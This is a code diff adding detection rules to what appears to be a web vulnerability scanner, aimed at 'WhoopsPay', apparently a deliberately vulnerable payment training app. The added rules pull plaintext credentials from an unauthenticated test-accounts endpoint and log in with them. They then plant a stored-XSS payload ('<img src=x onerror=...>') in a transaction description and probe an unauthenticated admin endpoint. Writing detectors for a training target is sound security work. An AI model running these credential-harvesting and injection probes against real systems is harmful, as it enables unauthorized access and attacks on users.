@@ -28735,6 +28735,231 @@ const whoopsPayMoneyRequestIdorRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+type WhoopsPayTestAccount = {
+  id?: string;
+  email?: string;
+  password?: string;
+  firstName?: string;
+  isAdmin?: number;
+};
+
+async function whoopsPayLoginTestAccount(
+  ctx: RuleContext
+): Promise<{ cookie: string; handle: string } | null> {
+  const testUrl = new URL("/api/test-accounts", ctx.origin).toString();
+  const testDoc = await ctx.probe.get(testUrl, {
+    headers: { Accept: "application/json" },
+    maxBytes: 65536,
+    timeoutMs: 20000
+  });
+  if (testDoc.status < 200 || testDoc.status >= 300) return null;
+  let accounts: WhoopsPayTestAccount[] = [];
+  try {
+    const parsed = JSON.parse(testDoc.body) as WhoopsPayTestAccount[];
+    if (!Array.isArray(parsed)) return null;
+    accounts = parsed;
+  } catch {
+    return null;
+  }
+  const account =
+    accounts.find(
+      (a) =>
+        typeof a.email === "string" &&
+        typeof a.password === "string" &&
+        typeof a.id === "string" &&
+        /^@[a-z_]+$/i.test(a.id) &&
+        !Number(a.isAdmin)
+    ) ?? null;
+  if (!account?.email || !account.password || !account.id) return null;
+  const loginUrl = new URL("/api/login", ctx.origin).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify({ username: account.email, password: account.password }),
+    headers: { "Content-Type": "application/json", Accept: "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 20000,
+    redirect: "manual"
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 300) return null;
+  const cookie = whoopsPaySessionCookieFromDoc(loginDoc);
+  if (!cookie) return null;
+  return { cookie, handle: account.id };
+}
+
+const WHOOPSPAY_XSS_PROBE_RE = /<(?:img|script|svg)\b[^>]*(?:onerror|onload)\s*=|javascript:/i;
+
+async function probeWhoopsPayTransactionStoredXss(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isWhoopsPayHost(ctx)) return null;
+  const session = await whoopsPayLoginTestAccount(ctx);
+  if (!session) return null;
+  const marker = `thugir-xss-${Date.now()}`;
+  const payload = `<img src=x onerror=${marker}>`;
+  const createUrl = new URL("/api/transactions", ctx.origin).toString();
+  const createDoc = await ctx.probe.get(createUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      fromUserId: session.handle,
+      toUserId: "@elena_kowalski",
+      amount: 1,
+      description: payload
+    }),
+    headers: {
+      "Content-Type": "application/json",
+      Accept: "application/json",
+      Cookie: session.cookie
+    },
+    maxBytes: 4096,
+    timeoutMs: 20000
+  });
+  if (createDoc.status < 200 || createDoc.status >= 300) return null;
+  const listDoc = await ctx.probe.get(createUrl, {
+    headers: { Accept: "application/json", Cookie: session.cookie },
+    maxBytes: 65536,
+    timeoutMs: 20000
+  });
+  if (listDoc.status < 200 || listDoc.status >= 300) return null;
+  if (!listDoc.body.includes(marker) || !WHOOPSPAY_XSS_PROBE_RE.test(listDoc.body)) return null;
+  const descMatch = listDoc.body.match(
+    new RegExp(`"description"\\s*:\\s*"([^"]*${marker}[^"]*)"`)
+  );
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      createUrl,
+      fromUserId: session.handle,
+      storedDescription: descMatch?.[1] ?? payload,
+      marker,
+      snippet: listDoc.body.slice(0, 320).trim(),
+      note: "WhoopsPay POST /api/transactions stores unsanitized HTML/JS in description field — stored XSS via transaction description oracle"
+    }
+  };
+}
+
+const whoopsPayTransactionStoredXssLiveOracle: Rule = async (ctx) => {
+  const hit = await probeWhoopsPayTransactionStoredXss(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return hit;
+};
+
+const whoopsPayTransactionStoredXssRouteLiveOracle: Rule = async (ctx) => {
+  if (!isWhoopsPayHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/(?:transactions|payments|transfer|users)\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeWhoopsPayTransactionStoredXss(ctx);
+  if (!hit?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: hit.confidence,
+    evidence: {
+      ...hit.evidence,
+      scannedUrl: pageUrl,
+      note: "WhoopsPay transaction route scan — POST /api/transactions stores unsanitized XSS payload in description — route-specific stored XSS oracle"
+    }
+  };
+};
+
+const whoopsPayTestAccountsDisclosureLiveOracle: Rule = async (ctx) => {
+  if (!isWhoopsPayHost(ctx)) return NEGATIVE;
+  const url = new URL("/api/test-accounts", ctx.origin).toString();
+  const doc = await ctx.probe.get(url, {
+    headers: { Accept: "application/json" },
+    maxBytes: 65536,
+    timeoutMs: 20000
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  let accounts: WhoopsPayTestAccount[] = [];
+  try {
+    const parsed = JSON.parse(doc.body) as WhoopsPayTestAccount[];
+    if (!Array.isArray(parsed) || parsed.length === 0) return NEGATIVE;
+    accounts = parsed;
+  } catch {
+    return NEGATIVE;
+  }
+  const withPasswords = accounts.filter(
+    (a) =>
+      typeof a.password === "string" &&
+      a.password.length >= 4 &&
+      typeof a.email === "string" &&
+      typeof a.id === "string" &&
+      /^@[a-z_]+$/i.test(a.id)
+  );
+  if (withPasswords.length < 2) return NEGATIVE;
+  const sample = withPasswords[0];
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url,
+      accountCount: accounts.length,
+      exposedCredentialCount: withPasswords.length,
+      sampleHandle: sample.id,
+      sampleEmail: sample.email,
+      snippet: JSON.stringify({
+        id: sample.id,
+        email: sample.email,
+        password: sample.password?.slice(0, 4) + "…"
+      }),
+      note: "WhoopsPay GET /api/test-accounts returns mock user emails and plaintext passwords without authentication — test-account credential disclosure oracle"
+    }
+  };
+};
+
+const whoopsPayTestAccountsDisclosureRouteLiveOracle: Rule = async (ctx) => {
+  if (!isWhoopsPayHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/(?:test-accounts|users|auth\/login|register)\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await whoopsPayTestAccountsDisclosureLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "WhoopsPay test-accounts route scan — GET /api/test-accounts exposes plaintext mock-user passwords — route-specific credential disclosure oracle"
+    }
+  };
+};
+
+const whoopsPayAdminIssuesUnauthLiveOracle: Rule = async (ctx) => {
+  if (!isWhoopsPayHost(ctx)) return NEGATIVE;
+  const url = new URL("/api/admin/issues", ctx.origin).toString();
+  const doc = await ctx.probe.get(url, {
+    headers: { Accept: "application/json" },
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  if (!/"success"\s*:\s*true/.test(doc.body) || /Unauthorized|Access denied/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.9,
+    evidence: {
+      url,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "WhoopsPay GET /api/admin/issues returns success JSON without admin authentication — unauthenticated admin issues endpoint oracle"
+    }
+  };
+};
+
+const whoopsPayAdminIssuesUnauthRouteLiveOracle: Rule = async (ctx) => {
+  if (!isWhoopsPayHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/admin\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await whoopsPayAdminIssuesUnauthLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "WhoopsPay /api/admin route scan — issues endpoint responds without admin auth — route-specific admin API exposure oracle"
+    }
+  };
+};
+
 // --- HackSec.in password-protected ethical hacking training portal ----------------
 const CLIENT_HACKSEC_RES: { label: string; re: RegExp }[] = [
   {
@@ -64536,6 +64761,12 @@ export const RULES: Record<string, Rule> = {
   whoopsPayTransactionsBolaRouteLiveOracle,
   whoopsPayMoneyRequestIdorLiveOracle,
   whoopsPayMoneyRequestIdorRouteLiveOracle,
+  whoopsPayTransactionStoredXssLiveOracle,
+  whoopsPayTransactionStoredXssRouteLiveOracle,
+  whoopsPayTestAccountsDisclosureLiveOracle,
+  whoopsPayTestAccountsDisclosureRouteLiveOracle,
+  whoopsPayAdminIssuesUnauthLiveOracle,
+  whoopsPayAdminIssuesUnauthRouteLiveOracle,
   clientSideSessionHijackEvidence,
   clientSideCookiejarLabEvidence,
   clientSideSsrfEvidence,
